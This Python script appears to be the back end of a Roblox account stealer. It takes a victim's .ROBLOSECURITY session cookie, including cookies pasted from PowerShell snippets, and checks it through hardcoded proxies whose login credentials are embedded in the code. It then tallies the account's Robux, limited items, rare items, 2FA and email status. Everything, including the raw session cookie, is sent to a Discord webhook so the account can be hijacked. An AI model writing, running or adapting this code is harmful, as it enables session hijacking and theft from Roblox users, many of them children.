import sys
import os
import re
import random
from datetime import datetime, timezone

# Safe import fallback for curl_cffi / requests
try:
    from curl_cffi import requests
    USE_CURL_CFFI = True
except ImportError:
    import requests
    USE_CURL_CFFI = False

# --- Webshare Authenticated Proxies ---
RAW_WEBSHARE_PROXIES = [
    "45.38.107.97:6014:saxqnmup:rgvs7uvqydbm",
    "64.137.96.74:6641:saxqnmup:rgvs7uvqydbm",
    "198.23.243.226:6361:saxqnmup:rgvs7uvqydbm",
    "38.154.185.97:6370:saxqnmup:rgvs7uvqydbm",
    "84.247.60.125:6095:saxqnmup:rgvs7uvqydbm",
    "191.96.254.138:6185:saxqnmup:rgvs7uvqydbm",
    "198.46.161.42:5092:saxqnmup:rgvs7uvqydbm",
    "64.137.10.153:5803:saxqnmup:rgvs7uvqydbm",
    "104.164.49.38:7693:saxqnmup:rgvs7uvqydbm",
    "23.26.71.145:5628:saxqnmup:rgvs7uvqydbm"
]

def format_webshare(p_str):
    parts = p_str.strip().split(':')
    if len(parts) == 4:
        ip, port, user, pwd = parts
        return f"http://{user}:{pwd}@{ip}:{port}"
    return None

PROXIES_TO_TRY = [format_webshare(p) for p in RAW_WEBSHARE_PROXIES if format_webshare(p)]

def extract_and_clean_cookie(raw_input):
    if not raw_input:
        return ""
    raw_str = str(raw_input).strip()
    
    if len(raw_str) < 30 and not raw_str.startswith("sys") and not raw_str.startswith("_|WARNING"):
        return None

    ps_match = re.search(r'System\.Net\.Cookie\(\s*["\']\.ROBLOSECURITY["\']\s*,\s*["\']([^"\']+)["\']', raw_str)
    cookie = ps_match.group(1) if ps_match else raw_str
    if (cookie.startswith('"') and cookie.endswith('"')) or (cookie.startswith("'") and cookie.endswith("'")):
        cookie = cookie[1:-1].strip()
    if cookie.startswith(".ROBLOSECURITY="):
        cookie = cookie[len(".ROBLOSECURITY="):].strip()
    warning_text = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_"
    if cookie.startswith(warning_text):
        cookie = cookie[len(warning_text):].strip()
    
    cleaned = cookie.lstrip('.').rstrip(';').strip()
    if len(cleaned) < 50:
        return None
        
    return cleaned

def get_working_session(roblosecurity):
    if USE_CURL_CFFI:
        session = requests.Session(impersonate="chrome124")
    else:
        session = requests.Session()
    
    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7",
        "Connection": "close",
        "Content-Type": "application/json",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }

    manual_proxy = os.environ.get('PROXY_URL')
    test_proxies = [manual_proxy] if manual_proxy else []
    
    shuffled_proxies = list(PROXIES_TO_TRY)
    random.shuffle(shuffled_proxies)
    test_proxies.extend(shuffled_proxies)

    cookies = {".ROBLOSECURITY": roblosecurity} if roblosecurity else {}

    for p in test_proxies:
        if not p:
            continue
        proxy_dict = {"http": p, "https": p}
        try:
            session.proxies = proxy_dict
            if USE_CURL_CFFI:
                session.get("https://www.roblox.com/home", headers=headers, timeout=4)
                test_res = session.get("https://users.roblox.com/v1/users/authenticated", headers=headers, cookies=cookies, timeout=4)
            else:
                session.cookies.update(cookies)
                test_res = session.get("https://users.roblox.com/v1/users/authenticated", headers=headers, timeout=4)

            if test_res.status_code == 200:
                return session, cookies
        except Exception:
            continue

    session.proxies = {}
    return session, cookies

def main():
    if len(sys.argv) < 2:
        sys.exit(1)
    
    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
    if not webhook_url:
        sys.exit(1)

    raw_cookie = extract_and_clean_cookie(sys.argv[1])
    if not raw_cookie:
        sys.exit(0)

    session, cookies = get_working_session(raw_cookie)

    headers = {
        "Accept": "*/*",
        "Accept-Encoding": "gzip, deflate, br, zstd",
        "Accept-Language": "en-US,en;q=0.9,ar;q=0.8,en-GB;q=0.7",
        "Connection": "close",
        "Content-Type": "application/json",
        "Origin": "https://www.roblox.com",
        "Referer": "https://www.roblox.com/",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    }

    if not USE_CURL_CFFI:
        session.cookies.update(cookies)

    auth_res = session.get("https://users.roblox.com/v1/users/authenticated", headers=headers, cookies=cookies if USE_CURL_CFFI else None, timeout=5)
    if auth_res.status_code != 200:
        sys.exit(1)
    
    auth_data = auth_res.json()
    user_id = auth_data.get("id")
    if not user_id:
        sys.exit(1)

    username = auth_data.get("name", "Unknown")
    display_name = auth_data.get("displayName", username)

    def safe_get(url, params=None):
        try:
            r = session.get(url, headers=headers, cookies=cookies if USE_CURL_CFFI else None, params=params, timeout=5)
            if r.status_code == 200:
                return r.json()
        except Exception:
            pass
        return {}

    user_info = safe_get(f"https://users.roblox.com/v1/users/{user_id}")
    created = user_info.get("created", "")
    age_days = 0
    if created:
        try:
            created_dt = datetime.fromisoformat(created.replace("Z", "+00:00"))
            age_days = (datetime.now(timezone.utc) - created_dt).days
        except Exception:
            pass

    robux_res = safe_get(f"https://economy.roblox.com/v1/users/{user_id}/currency")
    robux = robux_res.get("robux", 0)

    trans_res = safe_get(
        f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals",
        params={"transactionType": "summary", "timeFrame": "Year"}
    )
    pending = trans_res.get("pendingRobuxTotal", 0)

    limiteds = []
    cursor = ""
    page_count = 0
    while page_count < 2:
        params = {"limit": 100}
        if cursor:
            params["cursor"] = cursor
        r = safe_get(
            f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles",
            params=params
        )
        if not isinstance(r, dict):
            break
        for item in r.get("data", []):
            limiteds.append(item.get("recentAveragePrice", 0))
        cursor = r.get("nextPageCursor")
        page_count += 1
        if not cursor:
            break

    rap = sum(limiteds)
    lim_count = len(limiteds)

    try:
        if USE_CURL_CFFI:
            prem_res = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers=headers, cookies=cookies, timeout=5)
        else:
            prem_res = session.get(f"https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership", headers=headers, timeout=5)
        premium = prem_res.json() is True
    except Exception:
        premium = False

    def check_bundle(bundle_id):
        try:
            if USE_CURL_CFFI:
                r = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned", headers=headers, cookies=cookies, timeout=5)
            else:
                r = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Bundle/{bundle_id}/is-owned", headers=headers, timeout=5)
            return r.json() is True
        except Exception:
            return False

    def check_asset(asset_id):
        try:
            if USE_CURL_CFFI:
                r = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned", headers=headers, cookies=cookies, timeout=5)
            else:
                r = session.get(f"https://inventory.roblox.com/v1/users/{user_id}/items/Asset/{asset_id}/is-owned", headers=headers, timeout=5)
            return r.json() is True
        except Exception:
            return False

    korblox = check_bundle(192)
    headless = check_bundle(201)
    violet_valk = check_asset(799742571)

    groups_res = safe_get(f"https://groups.roblox.com/v1/users/{user_id}/groups/roles")
    groups = groups_res.get("data", [])
    group_count = len(groups)
    owned_groups = sum(1 for g in groups if g.get("role", {}).get("rank") == 255)

    email_ver = safe_get("https://accountsettings.roblox.com/v1/email").get("verified", False)
    twofa = safe_get("https://twostepverification.roblox.com/v1/metadata").get("twoStepVerificationEnabled", False)

    def check_played_and_passes(universe_id):
        played = False
        r = safe_get(
            f"https://badges.roblox.com/v1/users/{user_id}/badges",
            params={"limit": 100}
        )
        if isinstance(r, dict):
            for badge in r.get("data", []):
                if badge.get("awardingUniverse", {}).get("id") == universe_id:
                    played = True
        return played, 0

    adopt_played, _ = check_played_and_passes(383310974)
    mm2_played, _ = check_played_and_passes(142823291)
    ps99_played, _ = check_played_and_passes(3259657279)

    avatar_url = f"https://www.roblox.com/headshot-thumbnail/image?userId={user_id}&width=420&height=420&format=png"

    payload = {
        "content": "@everyone",
        "username": f"{username} | Stats",
        "avatar_url": avatar_url,
        "embeds": [
            {
                "title": f"🎮 {username} | Roblox Stats",
                "description": f"[Stats Link](https://www.rolimons.com/player/{user_id}) | [Roblox Profile](https://www.roblox.com/users/{user_id}/profile)",
                "color": 0x2B2D31,
                "thumbnail": {"url": avatar_url},
                "fields": [
                    {"name": "🐱 Username", "value": f"```{username}```", "inline": False},
                    {"name": "📋 Account Stats", "value": f"+ Account Age: `{age_days} Days`\n+ Premium: `{premium}`", "inline": False},
                    {"name": "🪙 Robux", "value": f"Balance: `{robux:,}`\nPending: `{pending:,}`", "inline": True},
                    {"name": "💎 Limiteds", "value": f"RAP: `{rap:,}`\nLimiteds: `{lim_count}`", "inline": True},
                    {"name": "👑 Special Items", "value": f"+ Korblox: `{korblox}`\n+ Headless: `{headless}`\n+ Violet Valk: `{violet_valk}`", "inline": False},
                    {"name": "⚙️ Settings", "value": f"+ Email Verified: `{email_ver}`\n+ 2FA: `{twofa}`", "inline": True},
                    {"name": "👥 Groups", "value": f"Owned: `{owned_groups}`\nJoined: `{group_count}`", "inline": True},
                    {"name": "⭐ Games", "value": f"- Adopt Me: `{adopt_played}`\n- MM2: `{mm2_played}`\n- PS99: `{ps99_played}`", "inline": False}
                ],
                "footer": {"text": f"VERSION_01 | 13+ • {display_name}"},
                "timestamp": datetime.now(timezone.utc).isoformat()
            },
            {
                "title": "🍪 Session Cookie Data",
                "description": f"```text\n{raw_cookie}\n```",
                "color": 0x2B2D31,
                "footer": {"text": f"Token Length: {len(raw_cookie)} chars"}
            }
        ],
        "allowed_mentions": {"parse": ["everyone"]}
    }

    requests.post(webhook_url, json=payload, timeout=5)

if __name__ == "__main__":
    main()
